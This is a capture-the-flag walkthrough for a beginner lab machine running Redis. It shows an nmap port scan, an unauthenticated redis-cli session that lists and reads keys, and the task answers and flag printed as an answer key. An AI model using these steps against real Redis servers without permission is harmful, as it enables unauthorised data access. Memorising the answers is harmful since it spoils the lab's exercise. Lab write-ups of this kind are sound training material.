# Redeemer

- **Category**: Starting Point - Tier 0
- **Difficulty**: Very Easy
- **Tags**: Redis, Vulnerability Assessment, Databases, Reconnaissance, Anonymous/Guest Access
- **Tools**: nmap, redis-cli (redis-tools)


# Walkthrough

- It's worth having a Redis CLI cheatsheet handy:
  - [Redis Cheat Sheet](https://lzone.de/cheat-sheet/Redis)
- `redis-cli` is provided by the `redis-tools` package


## Task 1: Which TCP port is open on the machine?

```bash
> nmap -sT -p- --min-rate=3000 10.129.136.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 16:43 AEST
Nmap scan report for 10.129.136.187
Host is up (0.23s latency).
Not shown: 58932 closed tcp ports (conn-refused), 6602 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds
```

> **Answer**: 6379

## Task 2: Which service is running on the port that is open on the machine?

> **Answer**: redis

## Task 3: What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database

> **Answer**: In-memory Database

## Task 4: Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.

> **Answer**: redis-cli

## Task 5: Which flag is used with the Redis command-line utility to specify the hostname?

> **Answer**: -h

## Task 6: Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

> **Answer**: info

## Task 7: What is the version of the Redis server being used on the target machine?

> **Answer**: 5.0.7

## Task 8: Which command is used to select the desired database in Redis?

> **Answer**: select

## Task 9: How many keys are present inside the database with index 0?

> **Answer**: 4

## Task 10: Which command is used to obtain all the keys in a database?

> **Answer**: keys *

# Submit Root Flag


```bash
# We can execute a command on the remote host
# Here we grab the info and grep for the version
> redis-cli -h 10.129.136.187 INFO | grep version
redis_version:5.0.7
gcc_version:9.3.0


# Alternatively, we can start an interactive session
# Here we run through the steps to find the flag
> redis-cli -h 10.129.136.187
10.129.136.187:6379> info keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.136.187:6379> select 0
OK
10.129.136.187:6379> keys *
1) "flag"
2) "temp"
3) "stor"
4) "numb"
10.129.136.187:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.136.187:6379> 
```

> **Answer**: 03e1d2b376c37ab3f5319922053953eb
